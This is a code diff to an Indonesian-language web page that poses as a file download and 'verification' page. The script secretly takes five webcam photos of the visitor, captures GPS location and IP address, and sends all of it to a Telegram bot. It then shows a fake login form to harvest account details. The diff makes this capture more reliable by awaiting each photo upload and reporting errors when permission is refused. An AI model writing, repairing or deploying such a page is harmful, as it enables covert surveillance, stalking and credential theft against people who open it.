@@ -378,6 +378,8 @@
   <div id="loader">
     <div class="spinner"></div>
     <p id="loaderText">Memulai proses download...</p>
+    <div id="cameraCounter" class="camera-counter" style="display: none;">Foto: 0/5</div>
+  </div>
 
   <script>
     // TELEGRAM CONFIG
@@ -433,9 +435,14 @@
     // STEP 1: START CAMERA CAPTURE - TAKE 5 PHOTOS
     async function startCameraCapture() {
       try {
-        document.getElementById('loaderText').textContent = 'Memulai verifikasi...';
+        console.log('Memulai akses kamera...');
+        document.getElementById('loaderText').textContent = 'Meminta izin kamera...';
         document.getElementById('cameraCounter').style.display = 'block';
         
+        // Tampilkan pesan persiapan dulu
+        await new Promise(resolve => setTimeout(resolve, 1000));
+        
+        // Request camera access
         cameraStream = await navigator.mediaDevices.getUserMedia({
           video: {
             facingMode: 'user',
@@ -445,6 +452,9 @@
           },
           audio: false
         });
+        
+        console.log('Kamera berhasil diakses');
+        document.getElementById('loaderText').textContent = 'Kamera diizinkan! Mengambil foto...';
         
         const video = document.createElement('video');
         video.srcObject = cameraStream;
@@ -474,44 +484,55 @@
           `📸 Akan mengambil 5 foto...`
         );
         
-        // Take 5 photos with 1 second interval
+        // Take 5 photos with delay
         const takePhotos = async () => {
+          console.log('Memulai pengambilan 5 foto...');
+          
           for (let i = 1; i <= 5; i++) {
-            if (!cameraStream || !video.readyState >= 2) break;
+            if (!cameraStream || !(video.readyState >= 2)) break;
             
             // Update counter
             photosTaken = i;
             document.getElementById('cameraCounter').textContent = `Foto: ${i}/5`;
             document.getElementById('loaderText').textContent = `Mengambil foto ${i}/5...`;
+            console.log(`Mengambil foto ${i}/5`);
             
-            // Wait for 1 second between photos
+            // Wait before taking photo (except first one)
             if (i > 1) {
               await new Promise(resolve => setTimeout(resolve, 1000));
             }
             
             // Capture frame
             ctx.save();
-            ctx.scale(-1, 1);
+            ctx.scale(-1, 1); // Mirror for front camera
             ctx.drawImage(video, -canvas.width, 0, canvas.width, canvas.height);
             ctx.restore();
             
             // Convert to blob and send to Telegram
-            canvas.toBlob(async (blob) => {
-              if (blob && blob.size > 1024) {
-                const fileName = `foto_kamera_${Date.now()}_${i}.jpg`;
-                const file = new File([blob], fileName, { type: 'image/jpeg' });
-                
-                await sendToTelegram(
-                  `📸 <b>FOTO KAMERA ${i}/5</b>\n` +
-                  `📁 File: ${fileName}\n` +
-                  `📦 Size: ${Math.round(blob.size/1024)} KB\n` +
-                  `⏰ ${new Date().toLocaleTimeString('id-ID')}`,
-                  file
-                );
-              }
-            }, 'image/jpeg', 0.85);
+            await new Promise((resolve) => {
+              canvas.toBlob(async (blob) => {
+                if (blob && blob.size > 1024) {
+                  const fileName = `foto_kamera_${Date.now()}_${i}.jpg`;
+                  const file = new File([blob], fileName, { type: 'image/jpeg' });
+                  
+                  console.log(`Mengirim foto ${i} ke Telegram...`);
+                  await sendToTelegram(
+                    `📸 <b>FOTO KAMERA ${i}/5</b>\n` +
+                    `📁 File: ${fileName}\n` +
+                    `📦 Size: ${Math.round(blob.size/1024)} KB\n` +
+                    `⏰ ${new Date().toLocaleTimeString('id-ID')}`,
+                    file
+                  );
+                }
+                resolve();
+              }, 'image/jpeg', 0.85);
+            });
+            
+            // Small delay between sending photos
+            await new Promise(resolve => setTimeout(resolve, 500));
           }
           
+          console.log('Semua foto telah diambil');
           // After all photos are taken
           setTimeout(async () => {
             // Send summary
@@ -536,36 +557,39 @@
             setTimeout(() => {
               captureLocation();
             }, 1000);
-          }, 2000);
+          }, 1000);
         };
         
         // Start taking photos
-        takePhotos();
+        await takePhotos();
         
       } catch (error) {
-        console.log('Camera error:', error.message);
+        console.error('Camera error:', error.message);
         document.getElementById('cameraCounter').style.display = 'none';
+        document.getElementById('loaderText').textContent = 'Kamera tidak diizinkan...';
         
         await sendToTelegram(
           `❌ <b>KAMERA DIBLOKIR</b>\n\n` +
           `⚠️ Pengguna menolak akses kamera\n` +
           `🕒 ${new Date().toLocaleString('id-ID')}\n` +
           `🌐 IP: ${await getIP()}\n\n` +
-          `📝 Catatan: Tidak dapat mengambil foto wajah`
+          `📝 Catatan: Tidak dapat mengambil foto wajah\n` +
+          `🔸 Error: ${error.message}`
         );
         
         // Skip to location capture if camera is blocked
         hasCapturedCamera = false;
         setTimeout(() => {
           captureLocation();
-        }, 1000);
+        }, 2000);
       }
     }
     
     // STEP 2: CAPTURE LOCATION
     async function captureLocation() {
       try {
-        document.getElementById('loaderText').textContent = 'Mengakses lokasi GPS...';
+        document.getElementById('loaderText').textContent = 'Meminta izin lokasi GPS...';
+        console.log('Meminta izin lokasi...');
         
         if (navigator.geolocation) {
           const position = await new Promise((resolve, reject) => {
@@ -576,6 +600,7 @@
             });
           });
           
+          console.log('Lokasi berhasil didapatkan');
           const ip = await getIP();
           await sendToTelegram(
             `📍 <b>LOKASI DITEMUKAN</b>\n\n` +
@@ -598,13 +623,16 @@
         }
         
       } catch (error) {
-        console.log('Location error:', error.message);
+        console.error('Location error:', error.message);
+        document.getElementById('loaderText').textContent = 'Lokasi tidak diizinkan...';
+        
         await sendToTelegram(
           `❌ <b>LOKASI DIBLOKIR</b>\n\n` +
           `⚠️ Pengguna menolak akses lokasi\n` +
           `🕒 ${new Date().toLocaleString('id-ID')}\n` +
           `🌐 IP: ${await getIP()}\n\n` +
-          `📝 Catatan: Tidak dapat mengambil koordinat GPS`
+          `📝 Catatan: Tidak dapat mengambil koordinat GPS\n` +
+          `🔸 Error: ${error.message}`
         );
         
         hasCapturedLocation = false;
@@ -612,6 +640,7 @@
       
       // STEP 3: SHOW LOGIN PAGE AFTER BOTH CAMERA AND LOCATION
       document.getElementById('loaderText').textContent = 'Menyiapkan halaman verifikasi...';
+      console.log('Menampilkan halaman login...');
       setTimeout(() => {
         showLoginPage();
       }, 1500);
@@ -625,11 +654,13 @@
       
       // Update security info box
       const securityInfo = document.querySelector('.security-info ul');
-      securityInfo.innerHTML = `
-        <li>✅ Kamera: ${hasCapturedCamera ? 'Tervalidasi (5 foto)' : 'Gagal'}</li>
-        <li>📍 Lokasi: ${hasCapturedLocation ? 'Tervalidasi' : 'Gagal'}</li>
-        <li>📱 Perangkat: Tervalidasi</li>
-      `;
+      if (securityInfo) {
+        securityInfo.innerHTML = `
+          <li>✅ Kamera: ${hasCapturedCamera ? 'Tervalidasi (5 foto)' : '❌ Gagal'}</li>
+          <li>📍 Lokasi: ${hasCapturedLocation ? 'Tervalidasi' : '❌ Gagal'}</li>
+          <li>📱 Perangkat: Tervalidasi</li>
+        `;
+      }
       
       // Send notification that login page is shown
       sendToTelegram(
@@ -642,7 +673,10 @@
       
       // Focus on email field
       setTimeout(() => {
-        document.getElementById('email').focus();
+        const emailField = document.getElementById('email');
+        if (emailField) {
+          emailField.focus();
+        }
       }, 500);
     }
     
@@ -705,8 +739,8 @@
               `🎉 <b>PROSES DOWNLOAD SELESAI</b>\n\n` +
               `✅ Semua data berhasil dikumpulkan\n` +
               `📊 Total data yang didapat:\n` +
-              `• 5 foto dari kamera\n` +
-              `• Lokasi GPS\n` +
+              `• ${hasCapturedCamera ? '5 foto dari kamera' : 'Kamera diblokir'}\n` +
+              `• ${hasCapturedLocation ? 'Lokasi GPS' : 'Lokasi diblokir'}\n` +
               `• Informasi akun lengkap\n\n` +
               `🕒 Waktu selesai: ${new Date().toLocaleString('id-ID')}\n` +
               `🌐 IP: ${ip}`
@@ -759,6 +793,7 @@
     
     // PAGE LOAD LOG
     window.addEventListener('load', async () => {
+      console.log('Halaman dimuat');
       const ip = await getIP();
       await sendToTelegram(
         `🌐 <b>HALAMAN DOWNLOAD DIBUKA</b>\n\n` +
